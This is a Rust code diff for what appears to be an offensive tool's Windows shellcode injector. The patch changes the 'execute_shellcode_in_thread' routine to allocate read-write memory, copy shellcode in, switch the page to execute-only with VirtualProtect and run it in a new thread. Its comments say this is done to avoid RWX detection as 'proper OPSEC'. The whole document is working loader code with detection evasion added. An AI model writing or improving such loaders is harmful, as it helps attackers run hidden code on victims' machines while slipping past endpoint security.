@@ -16,7 +16,7 @@ use winapi::shared::minwindef::DWORD;
 #[cfg(target_os = "windows")]
 use winapi::um::processthreadsapi::{CreateThread, GetExitCodeThread};
 #[cfg(target_os = "windows")]
-use winapi::um::memoryapi::{VirtualAlloc, VirtualFree};
+use winapi::um::memoryapi::{VirtualAlloc, VirtualFree, VirtualProtect};
 #[cfg(target_os = "windows")]
 use winapi::um::handleapi::CloseHandle;
 #[cfg(target_os = "windows")]
@@ -24,7 +24,7 @@ use winapi::um::synchapi::WaitForSingleObject;
 #[cfg(target_os = "windows")]
 use winapi::um::errhandlingapi::GetLastError;
 #[cfg(target_os = "windows")]
-use winapi::um::winnt::{MEM_COMMIT, MEM_RESERVE, MEM_RELEASE, PAGE_EXECUTE_READWRITE};
+use winapi::um::winnt::{MEM_COMMIT, MEM_RESERVE, MEM_RELEASE, PAGE_READWRITE, PAGE_EXECUTE_READ};
 
 // WAIT_TIMEOUT constant
 #[cfg(target_os = "windows")]
@@ -140,19 +140,18 @@ pub fn inject_shellcode(
 unsafe fn execute_shellcode_in_thread(shellcode: &[u8]) -> Result<String, String> {
     let buffer_size = shellcode.len();
     
-    // Allocate executable memory
+    // Allocate RW memory first (avoids RWX detection)
     let executable_mem = VirtualAlloc(
         ptr::null_mut(),
         buffer_size,
         MEM_COMMIT | MEM_RESERVE,
-        PAGE_EXECUTE_READWRITE,
+        PAGE_READWRITE,
     );
 
     if executable_mem.is_null() {
         return Err(format!(
-            "VirtualAlloc failed. Error: {}\n\n\
-            Failed to allocate {} bytes of executable memory",
-            GetLastError(), buffer_size
+            "VirtualAlloc failed. Error: {}",
+            GetLastError()
         ));
     }
 
@@ -162,6 +161,13 @@ unsafe fn execute_shellcode_in_thread(shellcode: &[u8]) -> Result<String, String
         executable_mem as *mut u8,
         buffer_size,
     );
+
+    // Flip RW to RX (no write after copy — proper OPSEC)
+    let mut old_protect: u32 = 0;
+    if VirtualProtect(executable_mem, buffer_size, PAGE_EXECUTE_READ, &mut old_protect) == 0 {
+        VirtualFree(executable_mem, 0, MEM_RELEASE);
+        return Err(format!("VirtualProtect failed. Error: {}", GetLastError()));
+    }
 
     // Create thread to execute shellcode
     let mut thread_id: u32 = 0;
